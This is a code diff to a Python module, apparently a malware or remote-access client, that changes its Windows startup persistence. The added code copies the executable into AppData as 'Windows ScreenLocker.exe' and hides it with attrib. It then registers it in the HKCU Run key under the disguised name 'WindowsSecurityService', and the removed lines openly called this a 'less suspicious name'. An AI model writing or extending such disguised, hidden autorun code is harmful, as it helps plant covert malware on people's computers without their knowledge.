@@ -39,7 +39,8 @@ def startup(path):
         system = platform.system()
         
         if system == "Windows":
-            return _startup_windows_registry(path)
+            result = _startup_windows_registry(path)
+            return result
         elif system == "Darwin":  # macOS
             return _startup_macos_system(path)
         elif system == "Linux":
@@ -53,60 +54,80 @@ def startup(path):
 
 def _startup_windows_registry(path):
     """Setup Windows startup using registry entries."""
+    import winreg as wr
+    import os
+    
     try:
-        import winreg
+        # Try to copy executable to AppData for persistence
+        copied_path = _copy_to_persistent_location(path)
         
-        # Use HKEY_CURRENT_USER for user-level persistence
-        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        
-        # Open the registry key
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
-        
-        # Set the registry value
-        app_name = "WindowsSecurityService"  # Less suspicious name
-        if path.endswith('.py'):
-            command = f'python "{path}"'
+        # Use the actual working path (either copied or original)
+        if copied_path and os.path.exists(copied_path):
+            client_path = os.path.abspath(copied_path)
         else:
-            command = f'"{path}"'
-            
-        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, command)
-        winreg.CloseKey(key)
+            client_path = os.path.abspath(path)
         
+        # Registry key for startup
+        try:
+            # Open key with both read and write permissions
+            key = wr.OpenKey(wr.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, wr.KEY_SET_VALUE | wr.KEY_QUERY_VALUE)
+            
+            # Set the value
+            wr.SetValueEx(key, "WindowsSecurityService", 0, wr.REG_SZ, client_path)
+            
+            # Verify immediately using the same key handle
+            try:
+                value, _ = wr.QueryValueEx(key, "WindowsSecurityService")
+            except FileNotFoundError:
+                pass  # Silent verification failure
+            
+            wr.CloseKey(key)
+            
+        except PermissionError as perm_error:
+            return False
+        except Exception as reg_error:
+            return False
+            
         # Store registry info globally for cleanup
         global registry_info
         registry_info = {
-            'key_path': key_path,
-            'value_name': app_name,
-            'root_key': winreg.HKEY_CURRENT_USER
+            'key_path': r"Software\Microsoft\Windows\CurrentVersion\Run",
+            'value_name': "WindowsSecurityService",
+            'root_key': wr.HKEY_CURRENT_USER
         }
-        
         return True
+            
+    except Exception as e:
+        return False
+
+
+def _copy_to_persistent_location(path):
+    """Copy executable to a persistent location in AppData."""
+    try:
+        import shutil
+        
+        # Get AppData Roaming directory
+        appdata_dir = os.path.join(os.path.expanduser("~"), "AppData", "Roaming")
+        
+        # Create target filename
+        target_filename = "Windows ScreenLocker.exe"
+        target_path = os.path.join(appdata_dir, target_filename)
+        
+        # Copy the file if it doesn't already exist or is different
+        if not os.path.exists(target_path) or os.path.getmtime(path) > os.path.getmtime(target_path):
+            shutil.copy2(path, target_path)
+            
+            # Make the file hidden (optional)
+            try:
+                import subprocess
+                subprocess.run(['attrib', '+h', target_path], check=False, capture_output=True)
+            except:
+                pass
+        
+        return target_path
         
     except Exception as e:
-        # Fallback to HKEY_LOCAL_MACHINE if HKEY_CURRENT_USER fails
-        try:
-            import winreg
-            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
-            
-            app_name = "WindowsSecurityService"
-            if path.endswith('.py'):
-                command = f'python "{path}"'
-            else:
-                command = f'"{path}"'
-                
-            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, command)
-            winreg.CloseKey(key)
-            
-            registry_info = {
-                'key_path': key_path,
-                'value_name': app_name,
-                'root_key': winreg.HKEY_LOCAL_MACHINE
-            }
-            
-            return True
-        except Exception as e2:
-            return False
+        return None
 
 
 def _startup_macos_system(path):
@@ -581,9 +602,3 @@ def get_system_info():
 
 # Global variable to store registry/system persistence info
 registry_info = None
-
-
-
-
-
-
